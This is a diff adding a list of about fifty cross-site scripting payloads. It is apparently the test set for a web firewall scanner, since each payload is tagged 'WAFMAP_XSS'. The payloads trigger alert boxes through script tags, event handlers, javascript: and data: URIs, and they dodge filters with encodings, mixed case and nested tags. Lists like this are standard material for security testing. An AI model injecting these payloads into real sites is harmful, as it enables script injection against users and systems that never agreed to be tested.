@@ -1,0 +1,56 @@
+<script>alert('WAFMAP_XSS')</script>
+<SCRIPT>alert('WAFMAP_XSS')</SCRIPT>
+<script>alert(1)</script>
+<script>prompt('WAFMAP_XSS')</script>
+<script>confirm('WAFMAP_XSS')</script>
+<script src="data:text/javascript,alert('WAFMAP_XSS')"></script>
+</title></style></textarea></script><script>alert('WAFMAP_XSS')</script>
+'">><marquee><img src=x onerror=confirm('WAFMAP_XSS')></marquee>"
+<img src=x onerror=alert('WAFMAP_XSS')//">
+<body onload=alert('WAFMAP_XSS')>
+<body onpageshow=alert('WAFMAP_XSS')>
+<body onfocus=alert('WAFMAP_XSS')>
+<img src=x onerror=alert('WAFMAP_XSS')>
+<img src=x onerror=alert(1)>
+<image src=x onerror=alert('WAFMAP_XSS')>
+<svg/onload=alert('WAFMAP_XSS')>
+<svg onload=alert('WAFMAP_XSS')>
+<iframe src="javascript:alert('WAFMAP_XSS')"></iframe>
+<iframe onload=alert('WAFMAP_XSS')></iframe>
+<input onfocus=alert('WAFMAP_XSS') autofocus>
+<select onfocus=alert('WAFMAP_XSS') autofocus>
+<textarea onfocus=alert('WAFMAP_XSS') autofocus>
+<keygen onfocus=alert('WAFMAP_XSS') autofocus>
+<marquee onstart=alert('WAFMAP_XSS')>
+<isindex type=image src=1 onerror=alert('WAFMAP_XSS')>
+<video><source onerror="alert('WAFMAP_XSS')">
+<audio src onloadstart=alert('WAFMAP_XSS')>
+<details ontoggle=alert('WAFMAP_XSS')>
+<details open ontoggle=alert('WAFMAP_XSS')>
+<object data="javascript:alert('WAFMAP_XSS')">
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+"><script>alert('WAFMAP_XSS')</script>
+'><script>alert('WAFMAP_XSS')</script>
+</script><script>alert('WAFMAP_XSS')</script>
+<ScRiPt>alert('WAFMAP_XSS')</sCrIpT>
+<ImG sRc=x oNeRrOr=alert('WAFMAP_XSS')>
+<img src=x onerror  =  alert('WAFMAP_XSS')>
+<img src=x onerror=
+alert('WAFMAP_XSS')>
+<svg/onload = alert('WAFMAP_XSS')>
+<script>alert('WAFMAP_XSS')%00</script>
+%00<script>alert('WAFMAP_XSS')</script>
+%253Cscript%253Ealert('WAFMAP_XSS')%253C%252Fscript%253E
+%3Cscript%3Ealert('WAFMAP_XSS')%3C%2Fscript%3E
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#87;&#65;&#70;&#77;&#65;&#80;&#95;&#88;&#83;&#83;&#39;&#41;>
+<a href="javascript:&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">Click</a>
+<script>\u0061\u006c\u0065\u0072\u0074('WAFMAP_XSS')</script>
+<script>alert`WAFMAP_XSS`</script>
+<script>throw 'WAFMAP_XSS'</script>
+<scr<script>ipt>alert('WAFMAP_XSS')</script>
+<div data-x="<script>alert('WAFMAP_XSS')</script>">
+<math><mtext><table><mglyph><svg><mtext><textarea><script>alert('WAFMAP_XSS')</script>
+<a href="javascript:alert('WAFMAP_XSS')">Click me</a>
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">Click</a>
+<form><button formaction=javascript:alert('WAFMAP_XSS')>Click</button>
+<comment><img src=x onerror=alert('WAFMAP_XSS')></comment>
